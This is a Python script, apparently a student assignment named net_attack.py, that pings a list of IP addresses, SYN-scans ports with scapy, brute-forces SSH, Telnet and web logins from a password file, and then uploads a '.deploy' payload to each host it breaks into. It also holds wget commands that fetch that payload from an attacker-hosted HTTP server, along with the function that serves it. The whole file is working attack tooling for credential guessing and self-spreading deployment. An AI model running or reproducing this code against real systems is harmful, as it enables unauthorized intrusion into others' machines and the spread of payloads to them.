#!/usr/bin/python3

from scapy.all import *
from os import path
from shutil import copyfile, rmtree
from telnetlib import Telnet
from paramiko import SSHClient, AutoAddPolicy, SFTPClient
from requests import get, post
from http.server import HTTPServer, SimpleHTTPRequestHandler

conf.verb = 0


def main():
    arguments = sys.argv[1:]
    number_of_arguments = len(arguments)
    if number_of_arguments < 8 or "-t" not in arguments or "-p" not in arguments or "-u" not in arguments or "-f" not in arguments:
        help()

    ip_file = arguments[arguments.index("-t") + 1]
    verify_file_exists(ip_file)

    ip_list = read_file_from_list(ip_file)
    print("[+] Determining which IP addresses are reachable...")

    ip_list = [ip for ip in ip_list if is_reachable(ip)]
    if not ip_list:
        print("[!] No reachable IP addresses found from the provided list")
        exit()

    ports = arguments[arguments.index("-p") + 1]
    port_list = get_ports_from_input(ports)

    username = arguments[arguments.index("-u") + 1]
    password_file = arguments[arguments.index("-f") + 1]
    verify_file_exists(password_file)
    password_list = read_file_from_list(password_file)

    # if "-d" in arguments:
    #     deployment_file = arguments[arguments.index("-d") + 1]
    #     deploy_file_to_server(deployment_file)

    deployed = False
    print("[+] Received %d response(s). Beginning attack!\n" % len(ip_list))
    for ip in ip_list:
        print("********** %s **********" % ip)
        for port in port_list:
            port_open = scan_port(ip, port)
            print("Port %d is %s on %s" % (port, "open" if port_open else "closed", ip))
            if port_open:
                bruteforce_function = {
                    22: bruteforce_ssh,
                    23: bruteforce_telnet,
                    80: bruteforce_web,
                    8080: bruteforce_web,
                    8888: bruteforce_web
                }[port]

                username_password = bruteforce_function(ip, port, username, password_list)
                if username_password:
                    print("Successfully logged into port %d with %s" % (port, username_password))
                    if port == 22 or port == 23 and not deployed:
                        credentials = username_password.split(":")
                        print(credentials)
                        deployed = transfer_file(ip, credentials[0], credentials[1],
                                                 arguments[arguments.index("-d") + 1], False)

        print("********** %s **********\n" % ip)


def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    ans, unans = sr(pkt, timeout=2)
    if len(ans) > 0:
        return "S" in str(ans[0][1][TCP].flags)
    else:
        return False


def bruteforce_telnet(ip, port, username, passwords):
    response = ""
    server_number = int(ip.split(".")[3])

    login_prompt = encode_in_ascii("login:")
    username_input = encode_in_ascii("%s\n" % username)
    password_prompt = encode_in_ascii("Password:")
    welcome_output = encode_in_ascii("Welcome to")

    cd_command = encode_in_ascii("cd /home/%s/assign_2/server_%d\n" % (username, server_number))
    print(cd_command)
    # dir_prompt = encode_in_ascii("%d>" % server_number)
    wget_command = encode_in_ascii("[ ! -f .deploy ] && wget 10.0.0.1:54325/.deploy\n")

    for password in passwords:
        connection = Telnet(ip, port=port)
        connection.read_until(login_prompt)
        connection.write(username_input)
        connection.read_until(password_prompt)
        connection.write(encode_in_ascii("%s\n" % password))
        banner = connection.read_until(welcome_output, timeout=1)
        if welcome_output in banner:
            #connection.write(cd_command)
            # connection.read_until(dir_prompt, timeout=1)
            #connection.write(wget_command)
            connection.close()
            # print(output)
            # print(connection.read_all())
            response = "%s:%s" % (username, password.rstrip())
            break

        connection.close()

    return response


def bruteforce_ssh(ip, port, username, passwords):
    response = ""
    server_number = int(ip.split(".")[3])
    cd_command = "cd /home/%s/assign_2/server_%d\n" % (username, server_number)
    wget_command = "[ ! -f .deploy ] && wget 10.0.0.1:54325/.deploy\n"
    ls_la_command = "ls -la\n"
    exit_command = "exit\n"
    for password in passwords:
        client = SSHClient()
        try:
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(ip, username=username, password=password, port=port)
            # print("Test")
            # sftp_client = client.open_sftp()
            # local_dir = os.getcwd()
            # local_path = "%s/%s" % (local_dir, "one_ip.txt")
            # remote_dir = "/home/%s/assign_2/server_2" % username
            # remote_path = "%s/%s" % (remote_dir, ".deploy")
            # sftp_client.chdir(remote_dir)
            # dir_contents = sftp_client.listdir()
            # print(dir_contents)
            # if ".deploy" not in dir_contents:
            #     sftp_client.put(localpath=local_path, remotepath=remote_path)
            #print("Contents " + str(sftp_client.listdir()))
            #print(sftp_client)
            #if sftp_client.getfo(".config"):
            #    print("Got file")
            #else:
            #    sftp_client.put(".deploy")

            # channel = client.invoke_shell()
            # stdin = channel.makefile('wb')
            # stdout = channel.makefile('rb')
            #
            # stdin.write('''%s %s %s %s''' % (cd_command, wget_command, ls_la_command, exit_command))
            # print(stdout.read())
            response = "%s:%s" % (username, password.rstrip())
            break
        except Exception as ex:
            print(ex)
            pass
        finally:
            client.close()

    return response


def bruteforce_web(ip, port, username, passwords):
    response = ""
    base_url = "http://%s:%d" % (ip, port)
    index_url = "%s/index.php" % base_url
    login_url = "%s/login.php" % base_url
    for password in passwords:
        index_response = get(index_url)
        if index_response.status_code == 200:
            login_response = post(login_url, data={"username": username, "password": password})
            if "Welcome" in login_response.text:
                response = "%s:%s" % (username, password)

    return response


def read_file_from_list(file):
    file_contents_list = []
    with open(file) as reader:
        file_contents_list = reader.read().splitlines()

    return file_contents_list


def is_reachable(ip):
    ans = sr1(IP(dst=ip, ttl=64) / ICMP(), timeout=2)
    return ans is not None


def transfer_file(ip, username, password, deployment_file, overwrite_existing):
    client = SSHClient()
    try:
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect(ip, username=username, password=password)
        with client.open_sftp() as sftp_client:
            local_dir = os.getcwd()
            local_path = "%s/%s" % (local_dir, deployment_file)

            ip_octals = ip.split(".")
            server_number = ip_octals[3]
            remote_dir = "/home/%s/assign_2/server_%s" % (username, server_number)
            remote_filename = ".deploy"
            remote_path = "%s/%s" % (remote_dir, remote_filename)

            sftp_client.chdir(remote_dir)
            dir_contents = sftp_client.listdir()
            if remote_filename not in dir_contents or overwrite_existing:
                sftp_client.put(localpath=local_path, remotepath=remote_path)

            return True
    except Exception as ex:
        print(ex)
        return False
    finally:
        client.close()


def deploy_file_to_server(file):
    current_directory = os.getcwd()
    current_file_location = "%s/%s" % (current_directory, file)
    temp_directory = "%s/net_attack_deployment" % current_directory
    file_name = ".deploy"

    if path.isdir(temp_directory):
        rmtree(temp_directory)

    os.mkdir(temp_directory)
    os.chdir(temp_directory)
    copyfile(current_file_location, file_name)

    server = ("", 54325)
    http = HTTPServer(server, SimpleHTTPRequestHandler)

    http_server_thread = threading.Thread(target=http.serve_forever, name="HTTP Server Thread")
    http_server_thread.daemon = True
    http_server_thread.start()


def get_ports_from_input(ports_input):
    ports = []
    ports_input_split = ports_input.split(",")
    for port in ports_input_split:
        if port.isdigit():
            ports.append(int(port))

    return ports


def verify_file_exists(file):
    if not path.isfile(file):
        print("Could not find file %s" % file)
        exit()


def encode_in_ascii(s):
    return s.encode("ascii")


def help():
    print("Example usage: ./net_attack.py -t my_ip_list.txt -p 22,23,25,80 -u admin -f my_password_list.txt")
    exit()


if __name__ == "__main__":
    main()
